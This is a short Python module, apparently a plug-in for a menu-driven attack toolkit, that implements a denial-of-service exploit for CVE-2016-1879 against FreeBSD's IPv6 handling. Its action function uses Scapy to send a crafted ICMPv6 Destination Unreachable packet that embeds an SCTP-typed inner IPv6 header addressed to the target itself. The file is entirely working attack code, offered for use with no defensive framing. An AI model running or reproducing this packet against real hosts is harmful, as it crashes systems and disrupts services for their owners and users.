from scapy.all import *
from template import Template

class IPv6Module(Template):

  def __init__(self, socketio, namespace):
    super(IPv6Module, self).__init__(socketio, namespace)
    self.modname = "CVE-2016-1879"
    self.menu_text = "FreeBSD IPv6 DoS"
    self.actions = [
      {
        "title": "FreeBSD IPv6 DoS",
        "action": "action",
        "target": True
      }
    ]

  def action(self, target=None):
    ip = target['ip']
    self.socket_log('Running DoS on '+target['ip'])
    DoS(ip)


def DoS(ip):
    send(IPv6(dst=ip) / ICMPv6DestUnreach() / IPv6(nh=132,src=ip, dst=ip))
